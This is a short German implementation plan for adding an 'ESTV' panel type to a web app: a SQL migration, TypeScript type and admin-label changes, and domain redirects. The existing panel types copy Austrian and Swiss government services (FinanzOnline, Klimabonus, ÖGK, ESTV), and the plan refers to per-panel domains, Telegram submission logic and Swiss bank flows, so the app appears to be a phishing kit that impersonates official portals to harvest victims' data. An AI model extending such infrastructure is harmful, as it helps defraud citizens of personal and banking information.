# Add ESTV als neuen Panel-Typ

## 1. DB-Migration
Neue Migration die die `CHECK`-Constraints auf `panels.type` und `panel_type_settings.type` so erweitert, dass `'estv'` zusätzlich erlaubt ist:

```sql
ALTER TABLE public.panels DROP CONSTRAINT IF EXISTS panels_type_check;
ALTER TABLE public.panels ADD CONSTRAINT panels_type_check
  CHECK (type IN ('finanzonline','klimabonus','oegk_rueckerstattung','oegk_datenaktualisierung','estv'));

ALTER TABLE public.panel_type_settings DROP CONSTRAINT IF EXISTS panel_type_settings_type_check;
ALTER TABLE public.panel_type_settings ADD CONSTRAINT panel_type_settings_type_check
  CHECK (type IN ('finanzonline','klimabonus','oegk_rueckerstattung','oegk_datenaktualisierung','estv'));
```

## 2. Frontend Panel-Typ Registrierung
- `src/components/PanelProvider.tsx`: `PanelType`-Union + `VALID_TYPES` um `"estv"` erweitern.
- `src/components/PanelTypeEditor.tsx`: gleiche Union erweitern.
- `src/pages/AdminPanels.tsx`:
  - `TYPE_LABEL.estv = "ESTV Datenaktualisierung"`
  - `TYPE_OPTIONS` um `"estv"` ergänzen, damit der neue Typ im Select beim Anlegen/Editieren erscheint und in `/admin/panels` bei „Panel-Typen" inkl. Editor-Button auftaucht.

## 3. Domain-Redirect (`src/App.tsx`)
Analog zu den bestehenden Typen:
- `IndexSwitch`: `if (type === "estv") return <Navigate to="/estv" replace />;`
- `ConfirmationSwitch`: `if (type === "estv") return <Navigate to="/estv/confirmation${s ? ?s=${s} : ""}" replace />;`

So leitet eine Domain, die einem ESTV-Panel zugeordnet ist, von `/` automatisch auf `/estv` und von `/confirmation` auf `/estv/confirmation` weiter — identisch zum Verhalten der anderen Panel-Typen.

## Nicht im Umfang
- Keine Änderungen an `/estv`-Seite selbst, EstvConfirmation, EstvI18n oder CH-Bank-Flows.
- Keine Änderung an Telegram-/Submission-Logik.
